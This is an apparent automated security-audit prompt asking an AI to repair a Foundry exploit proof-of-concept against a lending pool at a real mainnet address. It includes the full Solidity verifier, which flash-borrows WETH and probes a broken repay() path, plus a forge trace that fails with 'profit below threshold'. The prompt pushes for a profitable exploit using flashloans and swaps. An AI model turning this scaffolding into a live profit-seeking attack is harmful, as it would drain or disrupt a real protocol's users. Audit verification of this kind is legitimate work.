You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Standard ERC20 repayments are impossible because the pool uses `transferFrom(address(this), ...)` when forwarding funds
- claim: `repay()` first pulls tokens from the payer into the pool, then tries to forward those tokens with `IERC20(_supportedCurrency).transferFrom(address(this), _fundSource, ...)` and `transferFrom(address(this), _controlPlane, ...)`. For standard ERC20s, `transferFrom` spends an allowance granted by `address(this)`, but the pool never approves itself, so the outbound transfers revert.
- impact: Normal repayment cannot complete, so borrowers cannot recover collateral through the intended path and lender principal cannot be repaid through `repay()`. Live positions are forced into bad debt or privileged intervention paths.
- exploit_paths: ["A borrower calls `repay(nftID, repayAmount, pineWallet)` on an active loan.", "The inbound `transferFrom(msg.sender, address(this), repayAmount)` succeeds.", "The first outbound `transferFrom(address(this), _fundSource, ...)` or the fee transfer to `_controlPlane` reverts because the pool has no self-allowance."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPinePool {
    function _supportedCurrency() external view returns (address);
    function _fundSource() external view returns (address);
    function _controlPlane() external view returns (address);
    function paused() external view returns (bool);

    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);

    function flashLoan(
        address payable receiver,
        address reserve,
        uint256 amount,
        bytes calldata params
    ) external;

    function _loans(
        uint256 nftID
    )
        external
        view
        returns (
            uint256 loanStartBlock,
            uint256 loanExpireTimestamp,
            uint32 interestBPS1000000XBlock,
            uint32 maxLTVBPS,
            uint256 borrowedWei,
            uint256 returnedWei,
            uint256 accuredInterestWei,
            uint256 repaidInterestWei,
            address borrower
        );
}

interface IVmLike {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    struct LoanTermsView {
        uint256 borrowedWei;
        uint256 returnedWei;
        address borrower;
    }

    uint256 private constant MIN_REPAY_AMOUNT = 1;
    uint256 private constant MAX_LOAN_SCAN_EXCLUSIVE = 100_000;

    address private constant TARGET_POOL = 0x2405913d54fC46eEAF3Fb092BfB099F46803872f;
    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    uint256 private constant STORAGE_SLOT_CONTROL_PLANE = 203;
    uint256 private constant STORAGE_SLOT_FUND_SOURCE = 204;
    uint256 private constant STORAGE_SLOT_SUPPORTED_CURRENCY = 205;
    uint256 private constant STORAGE_SLOT_LOANS = 212;

    IPinePool private immutable POOL;
    IERC20Like private immutable SUPPORTED_CURRENCY_TOKEN;
    address private immutable SUPPORTED_CURRENCY;
    address private immutable FUND_SOURCE;
    address private immutable CONTROL_PLANE;

    IVmLike private constant VM = IVmLike(HEVM_ADDRESS);

    uint256 public candidateLoanId;
    bool public candidateLocated;
    bool public usedDirectBalance;
    bool public usedPoolFlashLoan;
    bool public storageLayoutVerified;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public selfTransferFromWithoutAllowanceWorks;

    uint8 public lastFailureCode;
    bytes public lastRevertData;
    uint256 public observedPoolSelfAllowance;
    uint256 public observedFundSourceAllowance;
    uint256 public observedFundSourceBalance;

    constructor() {
        POOL = IPinePool(TARGET_POOL);
        SUPPORTED_CURRENCY = POOL._supportedCurrency();
        FUND_SOURCE = POOL._fundSource();
        CONTROL_PLANE = POOL._controlPlane();
        SUPPORTED_CURRENCY_TOKEN = IERC20Like(SUPPORTED_CURRENCY);
    }

    function executeOnOpportunity() external {
        if (POOL.paused()) {
            lastFailureCode = 8;
            return;
        }

        storageLayoutVerified = _verifyStaticStorageAnchors();

        if (!candidateLocated) {
            _locateCandidateLoan();
        }

        if (!candidateLocated) {
            lastFailureCode = 1;
            return;
        }

        if (SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= MIN_REPAY_AMOUNT) {
            usedDirectBalance = true;
            _executeRepayPath(candidateLoanId, MIN_REPAY_AMOUNT);
            return;
        }

        observedFundSourceBalance = SUPPORTED_CURRENCY_TOKEN.balanceOf(FUND_SOURCE);
        if (observedFundSourceBalance < MIN_REPAY_AMOUNT) {
            lastFailureCode = 9;
            return;
        }

        observedFundSourceAllowance = SUPPORTED_CURRENCY_TOKEN.allowance(FUND_SOURCE, TARGET_POOL);
        if (observedFundSourceAllowance < MIN_REPAY_AMOUNT) {
            lastFailureCode = 10;
            return;
        }

        usedPoolFlashLoan = true;
        try
            POOL.flashLoan(
                payable(address(this)),
                SUPPORTED_CURRENCY,
                MIN_REPAY_AMOUNT,
                abi.encode(candidateLoanId, MIN_REPAY_AMOUNT)
            )
        {
            if (!hypothesisValidated && !hypothesisRefuted) {
                lastFailureCode = 6;
            }
        } catch (bytes memory reason) {
            lastRevertData = reason;
            lastFailureCode = 6;
        }
    }

    function executeOperation(address reserve, uint256 amount, uint256 fee, bytes calldata params) external {
        require(msg.sender == TARGET_POOL, "unexpected flash lender");
        require(reserve == SUPPORTED_CURRENCY, "unexpected reserve");
        require(fee == 0, "unexpected flash fee");

        (uint256 nftID, uint256 repayAmount) = abi.decode(params, (uint256, uint256));
        require(amount == repayAmount, "unexpected flash amount");

        _executeRepayPath(nftID, repayAmount);

        // When the hypothesis is validated, the repay call reverts before the temporary
        // 1-unit funding leaves this verifier, so the verifier can settle the flash loan here.
        // If the claim is refuted because the live token permits self-sourced transferFrom or
        // because the pool has a self-allowance, the verifier does not attempt any unrelated
        // route and returns the temporary capital immediately.
        if (SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= amount) {
            require(SUPPORTED_CURRENCY_TOKEN.transfer(FUND_SOURCE, amount), "flash settlement failed");
        }
    }

    function profitToken() external view returns (address) {
        return SUPPORTED_CURRENCY;
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function exploitPathUsed() external view returns (string memory) {
        if (hypothesisValidated) {
            return
                "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
        }

        if (hypothesisRefuted && selfTransferFromWithoutAllowanceWorks) {
            return
                "repay(nftID, repayAmount, pineWallet) remained the only path under test, but the live supported currency permitted self-sourced transferFrom(address(this), ...) without self-allowance, so the reported outbound revert stage was infeasible at this fork block";
        }

        if (hypothesisRefuted && observedPoolSelfAllowance > 0) {
            return
                "repay(nftID, repayAmount, pineWallet) remained the only path under test, but the pool already had a nonzero self-allowance for the supported currency, so the reported outbound revert stage was infeasible at this fork block";
        }

        return
            "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
    }

    function pathAnchors() external pure returns (string memory) {
        return
            "repay(nftID, repayAmount, pineWallet); transferFrom(msg.sender, address(this), repayAmount); transferFrom(address(this), _fundSource, ...); transferFrom(address(this), _controlPlane, ...)";
    }

    function expectedBrokenFlow() external view returns (address, address, address) {
        return (SUPPORTED_CURRENCY, FUND_SOURCE, CONTROL_PLANE);
    }

    function targetPool() external pure returns (address) {
        return TARGET_POOL;
    }

    function _executeRepayPath(uint256 nftID, uint256 repayAmount) internal {
        _probeSelfTransferFromSemantics(repayAmount);

        // If the supported token itself allows transferFrom(sender=msg.sender, ...), the
        // claimed revert cannot occur for this pool on this fork state.
        if (selfTransferFromWithoutAllowanceWorks) {
            hypothesisRefuted = true;
            lastFailureCode = 3;
            return;
        }

        observedPoolSelfAllowance = SUPPORTED_CURRENCY_TOKEN.allowance(TARGET_POOL, TARGET_POOL);
        if (observedPoolSelfAllowance > 0) {
            hypothesisRefuted = true;
            lastFailureCode = 5;
            return;
        }

        _attemptRepay(nftID, repayAmount);
    }

    function _locateCandidateLoan() internal {
        if (storageLayoutVerified) {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromStorage(nftID);
                if (loan.borrower == address(0)) {
                    continue;
                }
                if (loan.borrowedWei <= loan.returnedWei) {
                    continue;
                }

                candidateLoanId = nftID;
                candidateLocated = true;
                lastFailureCode = 0;
                delete lastRevertData;
                return;
            }
            return;
        }

        for (uint256 nftID = 0; nftID < 2_000; nftID++) {
            LoanTermsView memory loan = _loanTermsFromGetter(nftID);
            if (loan.borrower == address(0)) {
                continue;
            }
            if (loan.borrowedWei <= loan.returnedWei) {
                continue;
            }

            candidateLoanId = nftID;
            candidateLocated = true;
            lastFailureCode = 0;
            delete lastRevertData;
            return;
        }
    }

    function _attemptRepay(uint256 nftID, uint256 repayAmount) internal {
        require(SUPPORTED_CURRENCY_TOKEN.approve(TARGET_POOL, 0), "approve reset failed");
        require(SUPPORTED_CURRENCY_TOKEN.approve(TARGET_POOL, repayAmount), "approve failed");

        // This call follows the finding one-to-one:
        // 1. verifier calls repay on an active loan
        // 2. pool pulls `repayAmount` from the verifier into itself
        // 3. pool forwards the pool-held balance with transferFrom(address(this), _fundSource, ...)
        // 4. pool forwards the fee with transferFrom(address(this), _controlPlane, ...)
        try POOL.repay(nftID, repayAmount, address(0)) returns (bool ok) {
            if (ok) {
                hypothesisRefuted = true;
                lastFailureCode = 2;
            } else {
                lastFailureCode = 7;
            }
        } catch (bytes memory reason) {
            lastRevertData = reason;

            bytes32 reasonHash = keccak256(bytes(_decodeRevertString(reason)));
            if (
                reasonHash == keccak256(bytes("fund transfer unsuccessful (payload)")) ||
                reasonHash == keccak256(bytes("fund transfer unsuccessful (fee)"))
            ) {
                hypothesisValidated = true;
                lastFailureCode = 4;
                return;
            }

            lastFailureCode = 7;
        }
    }

    function _probeSelfTransferFromSemantics(uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        (bool ok, bytes memory ret) = SUPPORTED_CURRENCY.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, address(this), address(this), amount)
        );

        if (!ok) {
            return;
        }

        if (ret.length == 0) {
            selfTransferFromWithoutAllowanceWorks = true;
            return;
        }

        if (ret.length >= 32 && abi.decode(ret, (bool))) {
            selfTransferFromWithoutAllowanceWorks = true;
        }
    }

    function _verifyStaticStorageAnchors() internal view returns (bool) {
        return
            _slotAddress(STORAGE_SLOT_CONTROL_PLANE) == CONTROL_PLANE &&
            _slotAddress(STORAGE_SLOT_FUND_SOURCE) == FUND_SOURCE &&
            _slotAddress(STORAGE_SLOT_SUPPORTED_CURRENCY) == SUPPORTED_CURRENCY;
    }

    function _loanTermsFromGetter(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        (
            ,
            ,
            ,
            ,
            uint256 borrowedWei,
            uint256 returnedWei,
            ,
            ,
            address borrower
        ) = POOL._loans(nftID);

        loan.borrowedWei = borrowedWei;
        loan.returnedWei = returnedWei;
        loan.borrower = borrower;
    }

    function _loanTermsFromStorage(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        uint256 base = uint256(keccak256(abi.encode(nftID, STORAGE_SLOT_LOANS)));
        loan.borrowedWei = _slotUint(base + 3);
        loan.returnedWei = _slotUint(base + 4);
        loan.borrower = _slotAddress(base + 7);
    }

    function _slotUint(uint256 slot) internal view returns (uint256) {
        return uint256(VM.load(TARGET_POOL, bytes32(slot)));
    }

    function _slotAddress(uint256 slot) internal view returns (address) {
        return address(uint160(uint256(VM.load(TARGET_POOL, bytes32(slot)))));
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector != 0x08c379a0) {
            return "";
        }

        bytes memory sliced = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            sliced[i - 4] = revertData[i];
        }

        return abi.decode(sliced, (string));
    }
}

```

forge stdout (tail):
```
  └─ ← [Return] 0x0000000000000000000000003061007eec1898fac97403e692cde6299d0b3f90
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e) [staticcall]
    │   │   └─ ← [Return] 7349504076428393992 [7.349e18]
    │   ├─ [2717] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::allowance(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e, 0x2405913d54fC46eEAF3Fb092BfB099F46803872f) [staticcall]
    │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
    │   ├─ [70752] 0x2405913d54fC46eEAF3Fb092BfB099F46803872f::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 1, 0x00000000000000000000000000000000000000000000000000000000000017ab0000000000000000000000000000000000000000000000000000000000000001)
    │   │   ├─ [70547] 0x4cB4E3d9e2032e4561aE93Ec4815126371BBD0cE::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 1, 0x00000000000000000000000000000000000000000000000000000000000017ab0000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e) [staticcall]
    │   │   │   │   └─ ← [Return] 7349504076428393992 [7.349e18]
    │   │   │   ├─ [29648] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000c490e4646a91c3cbafa8c55540c94dcd0212037e
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [30724] FlawVerifier::executeOperation(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 1, 0, 0x00000000000000000000000000000000000000000000000000000000000017ab0000000000000000000000000000000000000000000000000000000000000001)
    │   │   │   │   ├─ [23032] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1
    │   │   │   │   ├─ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e, 1)
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000c490e4646a91c3cbafa8c55540c94dcd0212037e
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xc490E4646A91C3CBaFa8c55540c94Dcd0212037e) [staticcall]
    │   │   │   │   └─ ← [Return] 7349504076428393992 [7.349e18]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   └─ ← [Stop]
    ├─ [266] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [310] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18835344 [1.883e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2056.91s (2053.31s CPU time)

Ran 1 test suite in 2057.07s (2056.91s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 18501660)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
